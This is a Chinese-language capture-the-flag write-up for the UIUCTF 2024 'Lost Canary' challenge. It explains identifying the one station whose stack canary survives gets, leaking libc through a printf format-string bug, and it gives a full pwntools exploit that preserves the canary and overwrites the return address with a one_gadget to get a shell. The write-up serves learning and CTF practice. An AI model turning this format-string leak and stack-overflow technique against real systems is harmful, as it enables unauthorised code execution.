# UIUCTF 2024 Lost Canary

## 题目简述

程序包含 `0` 到 `32767` 共 32768 个“车站”函数，每个函数都把 4 字节栈缓冲区放在一个自定义 8 字节 canary 前，并使用 `gets`、`scanf("%s")` 或 `fgets` 加 `strcpy` 接收车票。题面明确说明这是 Rev/Pwn 混合题；由于最终必须利用格式化字符串泄露 libc 并劫持返回地址，本文按 Pwn 归档。

二进制为 x86-64 PIE，启用 Full RELRO、NX 和栈保护并动态链接到题目提供的 glibc 2.31。符号没有剥离，但数万个几乎相同的函数会显著干扰人工浏览。

## 解题过程

生成器揭示了 canary 设计。每个车站采用一种输入函数，并把一个该函数无法原样传入的终止字符塞进 canary：

| 输入路径 | 普通车站 canary 中的字符 | 无法通过的原因 | 唯一异常车站 |
| --- | --- | --- | --- |
| `gets` | 换行 `\n` | `gets` 遇换行停止 | 改成空格 |
| `scanf("%s")` | 空格 | `%s` 遇空白停止 | 只含字母 |
| `strcpy` | NUL `\0` | `strcpy` 遇 NUL 停止 | 改成换行 |

因此，并不是寻找“没有 canary 的函数”，而是寻找 canary 能被对应输入原语完整写回的那一个函数。可以编写 Ghidra、IDA 或 Binary Ninja 脚本枚举 `station_*` 和相邻的 `__stack_chk_guard_*`；也可以静态分析未剥离符号后按上述字符规则筛选。

与发布二进制对应的异常项是：

```c
uintptr_t __stack_chk_guard_14927 = (uintptr_t)0x7361754569205965;

void station_14927(void) {
    uintptr_t canary = __stack_chk_guard_14927;
    char buffer[4];
    sleep(1);
    printf("Welcome to station 14927.\nEnter ticket code:");
    gets(buffer);
    if ((canary = canary ^ __stack_chk_guard_14927) != 0)
        __stack_chk_fail();
}
```

该整数按 x86-64 小端序写入内存后为 `65 59 20 69 45 75 61 73`，其中有空格但没有换行，正好能完整通过 `gets`。官方 `solve.py` 顶部还残留一条关于车站 `15446` 的旧注释，那是另一轮生成结果；实际变量、发布源码和二进制应以 `14927`、`0x7361754569205965` 为准。

找到车站和 canary 还不够。`select_station` 直接把用户输入当作格式串：

```c
fgets(buffer, 16, stdin);
puts("Traveling to station: ");
printf(buffer);
station = atoi(buffer);
```

输入 `14927 %p` 时，`atoi` 仍解析出车站号，而 `%p` 会泄露栈上的 libc 地址。对题目提供的 `libc-2.31.so`，官方解题脚本验证了：

```text
libc_base = leak - 0x1ed723
one_gadget = libc_base + 0xe3b01
```

进入 `station_14927` 后，栈布局对应 4 字节缓冲区、8 字节自定义 canary、8 字节保存的 `rbp`，随后才是返回地址。最终脚本如下：

```python
from pwn import *

context.binary = elf = ELF("./lost_canary", checksec=False)

STATION = 14927
CANARY = 0x7361754569205965
LIBC_LEAK_OFFSET = 0x1ED723
ONE_GADGET_OFFSET = 0xE3B01

# 本地测试可改为 process("./lost_canary")。
p = remote("lost-canary.chal.uiuc.tf", 1337, ssl=True)

p.sendline(f"{STATION} %p".encode())
p.recvuntil(b"Traveling to station:")
p.recvline()
line = p.recvline().strip()
leak = int(line.split()[1], 16)
libc_base = leak - LIBC_LEAK_OFFSET

payload = flat(
    b"A" * 4,
    p64(CANARY),
    b"B" * 8,
    p64(libc_base + ONE_GADGET_OFFSET),
)
p.sendline(payload)
p.sendline(b"cat /flag.txt")
p.interactive()
```

成功保持 canary 校验并返回到 one-gadget 后，可以读取：

```text
uiuctf{the_average_sigpwny_transit_experience}
```

## 方法总结

本题先用逆向把 32768 个相似函数压缩成一条规则：输入函数的终止字符决定哪个 canary 无法被伪造，唯一不含对应禁用字符的车站就是利用入口。随后再利用车站选择处的格式化字符串泄露 libc，按 4、8、8 字节的栈布局保留 canary 并覆盖返回地址。

复现时最容易踩坑的是照抄生成器运行时打印的旧注释。随机生成题必须把脚本常量与实际发布二进制交叉验证；本题真正可用的车站是 `14927`，而不是注释中的 `15446`。
